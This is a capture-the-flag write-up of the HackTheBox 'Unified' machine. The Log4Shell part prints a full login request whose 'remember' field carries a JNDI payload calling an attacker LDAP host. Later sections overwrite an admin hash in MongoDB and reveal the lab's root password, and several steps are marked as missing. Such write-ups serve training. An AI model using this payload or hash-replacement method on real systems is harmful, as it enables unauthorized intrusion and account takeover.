---
title: Unified
author: Julien Bongars
date: 2025-05
link: "[app.hackthebox.com/machines/Unified](https://app.hackthebox.com/machines/Unified)"
tags:
  - HackTheBox
  - Very Easy
  - Linux
  - Hacking
---

# Unified — Writeup

> Platform: HackTheBox · Difficulty: **Very Easy** · OS: **Linux**
> Target: `10.129.71.133`
> Ref: [app.hackthebox.com/machines/Unified](https://app.hackthebox.com/machines/Unified)

## Summary

Unified is a Very Easy Linux box running a UniFi Network Controller. Several ports are open; the useful surface is the HTTPS dashboard on **8443** (with **8080** proxying into it). The login API logs the JSON `remember` field through Log4j, so a `${jndi:ldap://…}` payload in that field triggers **CVE-2021-44228 (Log4Shell)**. Confirming the outbound LDAP connect with `tcpdump`, then serving a malicious LDAP/JNDI payload, yields a reverse shell on the box.

From the shell, the local MongoDB on port **27117** (database `ace`) holds the UniFi admin document and its `x_shadow` hash. Replacing that hash with a known SHA-512 crypt value unlocks the UniFi UI as admin. From there the root SSH password is recovered as `NotACrackablePassword4U2022`, giving both flags.

---

## Recon

### Port scanning

<!-- TODO: full nmap/rustscan output was not captured in the draft — only the author's port notes. -->

```txt
22 - ssh
6789 - ibm-db2-admin?
8080 - http-proxy - status 404 - should ffuf?
8443 - web dashboard trying to crack. cannot ffuf as will redirect to login
8843 - ssl? - status 400 - may be used for api?
8880 - tcp? - status 404 - should ffuf
```

Port **8443** was found manually. **8080** is a proxy in front of 8443.

### Enumeration

ffuf against 8080 turns up paths that mostly redirect into the 8443 dashboard:

```txt
/print (Status: 302) [Size: 0] [--> https://10.129.68.135:8443/print]
/pages (Status: 302) [Size: 0] [--> /pages/]
/upload (Status: 302) [Size: 0] [--> https://10.129.68.135:8443/upload]
/file (Status: 302) [Size: 0] [--> https://10.129.68.135:8443/file]
/status (Status: 200) [Size: 76]
/v2 (Status: 302) [Size: 0] [--> https://10.129.68.135:8443/v2]
/api (Status: 302) [Size: 0] [--> https://10.129.68.135:8443/api]
/logout (Status: 302) [Size: 0] [--> /manage]
/setup (Status: 302) [Size: 0] [--> https://10.129.68.135:8443/setup]
/manage (Status: 302) [Size: 0] [--> https://10.129.68.135:8443/manage]
/op (Status: 302) [Size: 0] [--> https://10.129.68.135:8443/op]
/verify (Status: 302) [Size: 0] [--> /manage/account/verify?r=1]
```

The login UI on 8443 is the attack surface. Background on the Log4j issue: https://censys.com/blog/cve-2021-44228-log4j

---

## Stage 1: Log4Shell on UniFi `/api/login` → shell

The UniFi login handler logs username and the `remember` field. Injecting a JNDI lookup into `remember` makes Log4j resolve it at log time:

```java
log.info("username: ${username} ; remember: ${remember});

# resolves to:-
log.info("username: ${payload.username} ; remember: ${<payload>});
```

Capture the login POST in Burp and send it to Repeater. Listen for the LDAP callback:

```bash
└──╼ [★]$ sudo tcpdump -i tun0 port 1389
```

#### Original payload

```http
POST /api/login HTTP/1.1
Host: 10.129.53.120:8443
Content-Length: 81
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
Content-Type: application/json; charset=utf-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: */*
Origin: https://10.129.53.120:8443
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://10.129.53.120:8443/manage/account/login?redirect=%2Fmanage
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive

{"username":"testuser","password":"testpassword","remember": true,"strict":true}
```

#### Modified payload

```http
POST /api/login HTTP/1.1
Host: 10.129.53.120:8443
Content-Length: 111
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
Content-Type: application/json; charset=utf-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: */*
Origin: https://10.129.53.120:8443
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://10.129.53.120:8443/manage/account/login?redirect=%2Fmanage
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive

{"username":"testuser","password":"testpassword","remember":"${jndi:ldap://10.10.14.147:1389}",
"strict":true}
```

#### Result

```bash
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes


18:33:36.891611 IP 10.129.53.120.55414 > htb-ie8f9usvwk.1389: Flags [S], seq 1293191773, win 64240, options [mss 1362,sackOK,TS val 3435078781 ecr 0,nop,wscale 7], length 0
18:33:36.891622 IP htb-ie8f9usvwk.1389 > 10.129.53.120.55414: Flags [R.], seq 0, ack 1293191774, win 0, length 0
```

The target reaches out to port 1389 — Log4Shell is live. Stand up the malicious LDAP/JNDI server (author notes: `notes/infiltration/general/ldap-for-jndi-attack.md`) and complete the callback to get a reverse shell.

<!-- TODO: draft does not capture the LDAP server / payload-generation commands or the resulting shell transcript. -->

Stage result: reverse shell on the UniFi host.

---

## Stage 2: MongoDB `ace` → reset UniFi admin → root

Look for MongoDB via its socket or TCP. Port is **27117**, database **`ace`**:

```bash
mongo --port 27117 ace

# db.listCollections()
# db.admin.find().forEach(printjson)
```

Admin document includes the password hash:

```bash
# "x_shadow": "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",

# the $6 indicates the hash algo, Ry6Vdbse is the salt, the rest is the hashed password.

openssl passwd -6 -salt $(openssl rand -base64 16) password123
# output: $6$3PQnfHW5kwahebAm$KNiatOJON1Imt4YUmYsaSArn3R.r0QIFcrpySrqbrRaAfBulrPsqQjc20.WNjgbhIo1In17yytuZDIVxpgAGc/

# another option?
mkpasswd -m sha-512 Password1234
```

Overwrite `x_shadow` with the known hash for `password123`:

```js
db.admin.updateOne(
  { _id: ObjectId("61ce278f46e0fb0012d47ee4") },
  {
    $set: {
      x_shadow:
        "$6$3PQnfHW5kwahebAm$KNiatOJON1Imt4YUmYsaSArn3R.r0QIFcrpySrqbrRaAfBulrPsqQjc20.WNjgbhIo1In17yytuZDIVxpgAGc/",
    },
  },
);
```

Log into the UniFi UI with the new admin password. The root account password recovered from the box is:

```txt
NotACrackablePassword4U2022
```

<!-- TODO: draft does not show where NotACrackablePassword4U2022 was read from (e.g. UniFi settings / a file) — only the final value. -->

Stage result: UniFi admin access, root SSH with `NotACrackablePassword4U2022`, both flags.

---

## Credentials

| Source                         | Credential                                   | Notes                                   |
| ------------------------------ | -------------------------------------------- | --------------------------------------- |
| MongoDB `ace.admin` (original) | `x_shadow` `$6$Ry6Vdbse$8enMR5Znxoo…QgPTt4.` | SHA-512 crypt; not cracked              |
| MongoDB overwrite              | UniFi admin → `password123`                  | Hash generated with `openssl passwd -6` |
| Post-admin access              | root / `NotACrackablePassword4U2022`         | Used for root / SSH                     |

---

## Key lessons

- **Log4Shell can sit in non-username fields.** Here the JNDI string went in `remember`, which the server still logged — any logged attacker-controlled field is a candidate.
- **Confirm the callback before building the full chain.** `tcpdump -i tun0 port 1389` proved the LDAP connect before standing up the rogue LDAP server.
- **App config DBs beat cracking.** The UniFi admin hash was replaceable in MongoDB; generating a known `$6$` hash and `updateOne` was faster than attacking the original crypt.

---

## Tools & cheat sheet

| Tool                | Purpose in this box                 | Key command                                                      |
| ------------------- | ----------------------------------- | ---------------------------------------------------------------- |
| ffuf                | Path discovery on 8080              | paths under `/api`, `/manage`, `/setup`, …                       |
| Burp Suite          | Capture / replay UniFi `/api/login` | POST JSON with `remember` JNDI payload                           |
| `tcpdump`           | Confirm Log4Shell LDAP callback     | `sudo tcpdump -i tun0 port 1389`                                 |
| Rogue LDAP / JNDI   | Deliver Log4Shell payload → shell   | see `notes/infiltration/general/ldap-for-jndi-attack.md`         |
| `mongo`             | Read/update UniFi `ace` admin hash  | `mongo --port 27117 ace`                                         |
| `openssl passwd -6` | Generate replacement `x_shadow`     | `openssl passwd -6 -salt $(openssl rand -base64 16) password123` |
